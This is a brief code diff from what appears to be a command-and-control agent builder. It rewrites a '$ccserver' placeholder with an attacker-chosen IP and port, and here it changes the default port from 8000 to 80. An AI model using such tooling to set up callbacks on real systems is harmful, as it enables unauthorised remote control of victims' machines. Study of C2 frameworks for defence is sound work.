@@ -14,7 +14,7 @@ server = (ip+':'+port)
 print('[!] Agent Created and saved to ./AgentRequirements/' + fileName)
 
 # Old line and New Line
-old = '$ccserver = "192.168.9.4:8000"'
+old = '$ccserver = "192.168.9.4:80"'
 new = '$ccserver = "' + server + '"'
 
 # Delete old file
